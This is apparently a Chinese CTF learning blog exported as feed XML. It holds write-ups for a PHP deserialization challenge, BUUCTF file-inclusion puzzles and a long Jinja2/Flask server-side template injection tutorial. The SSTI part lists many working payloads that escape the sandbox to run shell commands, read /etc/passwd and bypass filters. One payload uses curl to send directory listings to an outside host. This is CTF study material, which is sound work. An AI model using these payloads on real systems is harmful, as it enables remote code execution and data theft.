青龙组]AreUSerialz</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#125;</code></pre><p>看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取</p><p>在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内</p><p>之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容</p><p>构造payload</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150325057.png" alt="image-20210705150325057"></p><p>这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p><pre class="language-php" data-language="php"><code class="language-php">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre><p>（刚开始给op赋了个字符型的“2”，找错找了半天。。。</p><p>拿到flag</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150240715.png" alt="image-20210705150240715"></p><p>接下来base64解码就可以拿到flag了</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150647307.png" alt="image-20210705150647307"></p><p>这周划水了（</p><p>忙着学科目三了，周三考完试再补点（</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704004536648.png" alt="image-20210704004536648"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti模板注入</title>
      <link href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p> 不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。</p> <span id="more"></span><h2 id="ssti概述"><a href="#ssti概述" class="headerlink" title="ssti概述"></a>ssti概述</h2><p>贴个大佬的文章</p><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</a></p><p>[关于python魔术方法payload：““.<strong>class</strong>.<strong>mro</strong><a href="https://blog.csdn.net/xiao__1bai/article/details/115672392">2].<strong>subclasses</strong>()<a href="%E2%80%9C/etc/passwd%E2%80%9C">40</a>.read() 的解释_xiao__1bai的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">模板注入总结_Herbert_555的博客-CSDN博客</a></p><p>SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；<br>漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。</p><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><pre class="language-python" data-language="python"><code class="language-python">__dict__ 保存类实例或对象实例的属性变量键值对字典__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__bases__   返回该对象所继承的基类&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre><p><strong>flask基本知识</strong></p><p>flask采用装饰器来指定路由，默认的模板渲染引擎为<strong>Jinja2</strong>。其中模板的三种主要语法为</p><ul><li>：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值</li><li>{ % … % }:装载一个控制语句</li><li>:装载一个注释</li></ul><p><strong>流程：</strong></p><ol><li><p>​    获取基本类</p></li><li><p>​    获取基本类的子类</p></li><li><p>​    找到重载过的<code>__init__</code>类</p></li><li><p>​    查看其引用<code>__builtins__</code></p></li><li><p>​    调用其中可用的函数</p></li></ol><p><strong>获取基本类</strong></p><p>​        利用<code>__bases__</code>或者是<code>__mro__</code>函数</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用</code></pre><p>//实话实说最后一个不是很懂</p><p><strong>获取基类的子类</strong></p><p>​    利用<code>__subclasses__</code>函数</p><pre class="language-python" data-language="python"><code class="language-python">object.__subclasses__()&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类</code></pre><p>SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用</p><p>我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号）</p><p><strong>找到重载过的<code>__init__</code>类</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__</code></pre><p> <strong>查看其引用<code>__builtins__</code></strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre><p><strong>使用os模块执行命令来读取flag</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)</code></pre><p><strong>来、姿势</strong></p><p><strong>1、config</strong></p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前</p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p><p><strong>2、self</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</code></pre><p><strong>3、&quot;&quot;、[]、()等数据结构</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p><p><strong>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</strong></p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p><p>例如：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</code></pre><p><strong>常见的过滤绕过</strong></p><p><strong>(1)只过滤<code>[]</code></strong></p><blockquote><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code><br>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p></blockquote><p><strong>(2)过滤_</strong></p><p>利用<code>request.args</code>属性<br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code><br>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p><p><strong>(3)关键字过滤</strong></p><ul><li>base64编码绕过<br><code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>例如被过滤掉<code>__class__</code>关键词<br><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></p><ul><li>字符串拼接绕过<br><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code><br><code>&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125;</code></li></ul><p><strong>(4)过滤{ {</strong></p><p>使用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>，例如</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; |  grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125;</code></pre><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre><p><strong>(5)引号内十六进制绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&quot;&quot;.__class__&#125;&#125;&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;_&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre><p><strong>(6)&quot; &#39; chr等被过滤，无法引入字符串</strong></p><ul><li>直接拼接键名</li></ul><pre class="language-python" data-language="python"><code class="language-python">dict(buil&#x3D;aa,tins&#x3D;dd)|join()</code></pre><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><pre class="language-python" data-language="python"><code class="language-python">(app.__doc__|list()).pop(102)|string()</code></pre><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><pre class="language-python" data-language="python"><code class="language-python">&#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125;      # uld&#x3D;%c&#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125;</code></pre><p><strong>(7)+等被过滤，无法拼接字符串</strong></p><ul><li><code>~</code><br>在jinja中可以拼接字符串</li><li>格式化字符串<br>同上</li></ul><p>例一：<br>warnings.catch_warnings类</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p><p>最后获取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>例二：</p><pre class="language-python" data-language="python"><code class="language-python">class’site._Printer’类&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>获取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>例三：<br>popen</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>搭了个靶场</p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先找基本类</p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p><p>再获取基本类的子类</p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p><p>找到重载过的<code>__init__</code>类</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</code></pre><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p><p>查看其引用<code>__builtins__</code></p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p><p>利用eval命令执行来读取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125;</code></pre><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个过滤了{ { ，所以要采用{ % % }的形式</p><p>{ % % }内加控制语句</p><p>且这里展示数据要利用{ % print % }</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125;</code></pre><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p><p>还有一种是利用控制语句</p><p>寻找符合条件的子类再利用WarningMessage的<code>__bulitins__</code>执行代码这个还不太懂先贴一下payload</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if  sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></pre><p>补:</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%ifsub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;</code></pre><p>要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令<br>&lt;class ‘warnings.catch_warnings’&gt;<br>一般位置为59，可以用它来调用file、os、eval、commands等</p><p>调用file</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()      #把 read() 改为 write() 就是写文件</code></pre><p>import os</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read()</code></pre><p>调用eval</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)</code></pre><p>调用system方法。（不包含system，可以绕过过滤system的情况）</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><p>利用commands进行命令执行</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125;</code></pre><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在学了在学了（</p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码</p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p><p>试着访问app。py</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p><p>这里可以看到过滤了一些内容</p><p>再查找目录内内容</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p><p>看见一个this_is_the_flag.txt</p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p><p>尝试去访问,得到flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>也可以利用切片的方式</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p><p><img src="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210825113642464.png" alt="image-20210825113642464"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> ssti注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录</title>
      <link href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>记录一下自己buu的刷题进度，留下点wp方便以后看</p> <span id="more"></span><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404004946660.png" alt="image-20210404004946660"></p><p>进入后看到滑稽表情，查看源码看到有source.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404005053754.png" alt="image-20210404005053754"></p><p>看到php代码</p><p>要求传入一个字符串类型的file，且需满足class emmm中的条件</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php  highlight_file(__FILE__);  class emmm  &#123;    public static function checkFile(&amp;$page)    &#123;      $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];     判断传入的参数是否为空，且是否为string类型      if (! isset($page) || !is_string($page)) &#123;        echo &quot;you can&#39;t see it&quot;;        return false;      &#125;判断传入的参数中是否有白名单内的内容      if (in_array($page, $whitelist)) &#123;        return true;      &#125;mb_substr()函数切割参数从0到第mb_strpos()函数返回的数值      $_page &#x3D; mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)      );       判断切割后的参数是否在白名单中      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;   切割后的参数经过url解码后再进行一次过滤      $_page &#x3D; urldecode($page);      $_page &#x3D; mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)      );      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;      echo &quot;you can&#39;t see it&quot;;      return false;    &#125;  &#125;  if (! empty($_REQUEST[&#39;file&#39;])    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])  )      if内为真时进行文件包含  &#123;    include $_REQUEST[&#39;file&#39;];    exit;  &#125; else &#123;    echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;  &#125; </code></pre><p>由于hint.php中提示flag在ffffllllaaaagggg中且whitelist中仅有source.php和hint.php</p><p>所以传入</p><p>file=hint.php?ffffllllaaaagggg</p><p>无回显</p><p>后多次利用../查看上级目录</p><p>最终payload为</p><p>file=hint.php?/../../../../ffffllllaaaagggg</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404142347332.png" alt="image-20210404142347332"></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>进入后看到这个界面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152133426.png" alt="image-20210410152133426"></p><p>查看源码可以找到Archive_room.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152211470.png" alt="image-20210410152211470"></p><p>发现这个页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152300206.png" alt="image-20210410152300206"></p><p>点击按钮后页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152324518.png" alt="image-20210410152324518"></p><p>尝试抓包发现secr3t.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152351530.png" alt="image-20210410152351530"></p><p>访问得到php代码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152616564.png" alt="image-20210410152616564"></p><p>是文件包含，flag在flag.php中，过滤了../,tp,input,date.</p><p>利用php://filter绕过</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410153820003.png" alt="image-20210410153820003"></p><p>构造file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152727528.png" alt="image-20210410152727528"></p><p>base64解码后得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152820778.png" alt="image-20210410152820778"></p><h2 id="基础验证"><a href="#基础验证" class="headerlink" title="基础验证"></a>基础验证</h2><p><img 